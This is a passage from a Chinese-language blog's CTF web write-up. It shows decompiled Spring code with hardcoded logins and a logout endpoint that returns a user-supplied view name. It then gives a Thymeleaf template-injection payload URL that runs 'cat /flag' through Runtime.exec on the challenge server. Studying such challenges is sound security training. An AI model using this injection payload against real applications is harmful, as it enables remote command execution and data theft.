+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(AuthenticationManagerBuilder auth)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    ((InMemoryUserDetailsManagerConfigurer)auth.inMemoryAuthentication().withUser(<span class="string">&quot;admin&quot;</span>).password(<span class="built_in">this</span>.passwordEncoder().encode(<span class="string">&quot;admin&quot;</span>)).roles(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;ADMIN&quot;</span>&#125;).and()).withUser(<span class="string">&quot;user&quot;</span>).password(<span class="built_in">this</span>.passwordEncoder().encode(<span class="string">&quot;woshiuser&quot;</span>)).roles(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;USER&quot;</span>&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现两个用户名密码(ADMIN,admin)(user,woshiuser),使用admin账号进行登录,没什么用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LoginController</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/login&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">login</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&#123;&quot;/logout&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">logout</span><span class="params">(<span class="meta">@RequestParam(required = false,defaultValue = &quot;index&quot;)</span> String page)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> page;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>研究了一下logincontroller,发现可以传入参数page,并且存在错误回显</p>
+<p>payload:<a target="_blank" rel="noopener" href="http://1.container.jingsai.apicon.cn:31953//page=lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat%20/flag%22).getInputStream()).next()%7d__::.x">http://1.container.jingsai.apicon.cn:31953//page=lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;cat%20/flag&quot;).getInputStream()).next()%7d__::.x</a></p>
+<p>获取flag成功.</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/10/19/Hgame-mini%20Web-writeups/" data-id="clnx5qaj20002ygst73i81s4z" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/10/19/KFC%E8%AE%A2%E5%8D%95%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/10/19/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/10/19/%E5%A6%82%E4%BD%95%E5%BC%80%E5%90%AF%E4%B8%80%E4%B8%AAdocker/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/10/19/%E5%90%AF%E5%8A%A8jar%E6%96%87%E4%BB%B6/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/10/19/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/10/19/Web%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91%E7%AC%AC%E4%B8%80%E8%AF%BE2.0/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/10/19/Web%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91%E7%AC%AC%E4%B8%80%E8%AF%BE/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
